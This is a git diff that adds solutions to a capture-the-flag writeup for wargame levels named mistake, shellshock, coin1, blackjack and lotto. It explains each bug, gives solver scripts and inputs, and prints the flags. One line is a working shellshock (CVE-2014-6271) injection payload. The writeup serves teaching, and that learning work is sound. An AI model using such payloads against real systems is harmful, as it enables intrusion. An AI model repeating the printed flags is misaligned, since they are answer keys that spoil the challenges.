@@ -1,4 +1,4 @@
-# The Write Up for Toddler's Bottle Level
+# The Writeup for Toddler's Bottle Level
 
 ## Introduction
 
@@ -509,6 +509,247 @@ Compile the source code into binary and then scp the binary to the server side b
 
 -
 `Mommy! I learned how to pass various input in Linux :)`
+
+-
+
+### mistake
+The vulnerability in this case is about operator priority. Firstly, the source code is attached.
+
+```
+#include <stdio.h>
+#include <fcntl.h>
+
+#define PW_LEN 10
+#define XORKEY 1
+
+void xor(char* s, int len){
+	int i;
+	for(i=0; i<len; i++){
+		s[i] ^= XORKEY;
+	}
+}
+
+int main(int argc, char* argv[]){
+	
+	int fd;
+	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
+		printf("can't open password %d\n", fd);
+		return 0;
+	}
+
+	printf("do not bruteforce...\n");
+	sleep(time(0)%20);
+
+	char pw_buf[PW_LEN+1];
+	int len;
+	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
+		printf("read error\n");
+		close(fd);
+		return 0;		
+	}
+
+	char pw_buf2[PW_LEN+1];
+	printf("input password : ");
+	scanf("%10s", pw_buf2);
+
+	// xor your input
+	xor(pw_buf2, 10);
+
+	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
+		printf("Password OK\n");
+		system("/bin/cat flag\n");
+	}
+	else{
+		printf("Wrong Password\n");
+	}
+
+	close(fd);
+	return 0;
+}
+
+``` 
+
+The vulnerability exists in the line
+
+`fd=open("/home/mistake/password",O_RDONLY,0400) < 0` 
+
+The variable `fd` will be 0, if open function calls successfully.
+The vulnerability results the buffer `pw_buf` is assigned by the input from user.
+
+The input works very well:
+
+```
+AAAAAAAAAA
+@@@@@@@@@@
+```
+
+The flag is:
+
+-
+`Mommy, the operator priority always confuses me :(`
+
+-
+
+### shellshock
+
+The shellshock is a command injection vulnerability which could be conduct through manipulating environment variables in shell.
+
+I tried the command `env x='() { :;}; /bin/cat flag' ./shellshock `, then got the flag.
+
+-
+`only if I knew CVE-2014-6271 ten years ago..!!`
+
+-
+
+### coin1
+
+The counterfeit coin will be tested through binary search.
+The answer python source code is followed.
+
+```
+#!/usr/bin/env python
+
+import re
+import socket
+from sets import Set
+
+IP= "127.0.0.1"
+PORT = 9007
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((IP,PORT))
+BUFF_SIZE=4096
+bala=sock.recv(BUFF_SIZE)
+print("recv: len:%d"%len(bala))
+while (True):
+	line = sock.recv(BUFF_SIZE)
+	line.rstrip()
+	print ("recv: \n"+line)
+	pack=re.findall('[0-9]+',line)
+	N=0
+	C=0
+	if 2==len(pack):
+		N=int(pack[0])
+		C=int(pack[1])
+	else:
+		print("Game Over!")
+	#print("N=%d, C=%d"%(N,C))
+	coinList=range(N)
+	pickNum = N/2
+	roundCnt=0
+	while (True):
+		roundCnt+=1
+		candidateList=[]
+		send_text=""
+		cand_len=0;
+		for i in coinList:
+			candidateList.append(i)
+			cand_len+=1
+			send_text+=(str(i)+" ")
+			if cand_len>= pickNum:
+				send_text.rstrip()
+				send_text+="\n"
+				sock.sendall(send_text)
+				print("send: "+send_text)
+				break;
+		ret_text = sock.recv(BUFF_SIZE)
+		print("recv: "+ret_text)
+		if ret_text.startswith("Correct!"):
+			print("Correct!")
+			break
+		if ret_text.startswith("Wrong"):
+			coinList = list(Set(coinList)-Set(candidateList))
+		else:
+			ret_val = int(ret_text)
+			if ret_val == cand_len*10: #all real
+				coinList = list(Set(coinList)-Set(candidateList))
+			else: # one of then is fake, others are real
+				coinList = candidateList
+		print("No. %d, coinList: %d"%(roundCnt,len(coinList)))
+		if 1==len(coinList):
+			fake_ind = coinList[0]
+			while roundCnt<=C:
+				roundCnt+=1
+				sock.sendall(str(fake_ind)+"\n")
+				print("send: "+str(coinList[0]))
+				ret_text = sock.recv(BUFF_SIZE)
+				print("No.%d recv: %s"%(roundCnt,ret_text))
+				if ret_text.startswith("Correct!"):
+					print("Correct!")
+					break
+			break
+		pickNum=len(coinList)/2
+sock.close()
+```
+
+The flag is:
+
+-
+`b1NaRy_S34rch1nG_1s_3asy_p3asy`
+
+-
+
+### blackjack
+The vulnerability of the source code is about semantic check. the bet checking will be failed at the second times. And user can also input a negtive number, then magic will happen when you lose a game. This vulnerability is found by my lovely wife.
+
+The source code is followed.
+
+```
+int betting() //Asks user amount to bet
+{
+ printf("\n\nEnter Bet: $");
+ scanf("%d", &bet);
+ 
+ if (bet > cash) //If player tries to bet more money than player has
+ {
+        printf("\nYou cannot bet more money than you have.");
+        printf("\nEnter Bet: ");
+        scanf("%d", &bet);
+        return bet;
+ }
+ else return bet;
+} // End Function
+```
+
+The flag is.
+
+-
+`YaY_I_AM_A_MILLIONARE_LOL`
+
+-
+
+### lotto
+The vulnerability exists in the logic of the calculation of the lotto mark.
+
+```
+// calculate lotto score
+int match = 0, j = 0;
+for(i=0; i<6; i++){
+	for(j=0; j<6; j++){
+		if(lotto[i] == submit[j]){
+			match++;
+		}
+	}
+}
+```
+
+It is high probable that a submit[j] is equal to any of the characher of lotto[].
+
+This is my sulotion.
+
+```
+#!/usr/bin/env python
+import sys
+for i in range(10):
+    print(1)
+    sys.stdout.flush()
+    sys.stdout.write(' '*6+'\n')
+    sys.stdout.flush()
+```
+
+The flag is.
+
+-
+`sorry mom... I FORGOT to check duplicate numbers... :(`
 
 -
 
